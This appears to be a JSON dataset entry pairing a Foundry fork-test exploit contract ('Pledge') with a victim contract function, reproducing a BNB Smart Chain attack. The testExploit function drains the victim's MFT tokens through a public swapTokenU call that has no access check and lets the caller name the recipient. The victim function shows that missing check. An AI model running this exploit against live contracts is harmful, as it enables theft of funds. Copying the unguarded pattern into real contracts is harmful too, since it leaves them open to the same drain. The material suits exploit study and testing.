[
  {
    "contract/interface": "Pledge",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Pledge",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Pledge",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Pledge",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Pledge",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Pledge",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        /*\n          \"bsc\"\uff1a\u8868\u793a\u5206\u53c9\u7684\u662f Binance Smart Chain (BSC)\uff0c\u5373\u6a21\u62df\u73af\u5883\u5c06\u4f7f\u7528 BSC \u7684\u72b6\u6001\u3002\n          blocknumToForkFrom\uff1a\u6307\u660e\u4ece\u54ea\u4e2a\u533a\u5757\u9ad8\u5ea6\u5f00\u59cb\u8fdb\u884c\u5206\u53c9\u3002\u5373 44_555_337 \u8fd9\u4e2a\u533a\u5757\u53f7\uff0c\u5b83\u662f\u8be5\u7f51\u7edc\u4e0a\u7684\u4e00\u4e2a\u5386\u53f2\u533a\u5757\uff0c\u4ee3\u7801\u5c06\u4ece\u8be5\u533a\u5757\u7684\u72b6\u6001\u8fdb\u884c\u6a21\u62df\u3002\n        */\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        /*\n            deal \u662f Foundry \u6d4b\u8bd5\u6846\u67b6\u4e2d\u7684\u4e00\u4e2a\u65b9\u6cd5\uff0c\u7528\u4e8e\u5728\u6307\u5b9a\u5730\u5740\u5206\u914d\u67d0\u79cd\u8d44\u4ea7\u3002\n            \u8fd9\u91cc\uff0c\u5b83\u8868\u793a\u5c06 BUSD \u4ee3\u5e01\u5206\u914d\u5230\u5f53\u524d\u5408\u7ea6\u7684\u5730\u5740\uff08address(this)\uff09\uff0c\u5e76\u4e14\u5206\u914d\u6570\u91cf\u4e3a 0\u3002\n            BUSD\uff1a\u4ee3\u5e01\u7684\u5408\u7ea6\u5730\u5740\u3002\n            address(this)\uff1a\u5f53\u524d\u5408\u7ea6\u7684\u5730\u5740\u3002\n            0\uff1a\u6307\u5b9a\u7684\u6570\u91cf\uff0c\u8fd9\u91cc\u662f\u5c06 0 \u4e2a BUSD \u4ee3\u5e01\u5206\u914d\u7ed9\u5f53\u524d\u5408\u7ea6\u3002\n       */\n        deal(BUSD, address(this), 0);\n        fundingToken = address(BUSD);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Pledge",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Pledge",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Pledge",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Pledge",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Pledge",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Pledge",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Pledge",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public balanceLog {\n        uint256 amount = IERC20(MFT).balanceOf(pledge);\n        address _target = address(this);\n        IPledge(pledge).swapTokenU(amount, _target);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IPledge",
    "source_type": "victim_contract",
    "function_name": "swapTokenU",
    "original_code": "    function swapTokenU(uint256 amount, address _target) public {\n        IERC20(_token).approve(address(_swapRouter), MAX);\n        address[] memory path = new address[](2);\n        path[0] = _token;\n        path[1] = _USDT;\n        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                amount,\n                0,\n                path,\n                _target,\n                block.timestamp\n        );\n    }\n\n",
    "description": ""
  }
]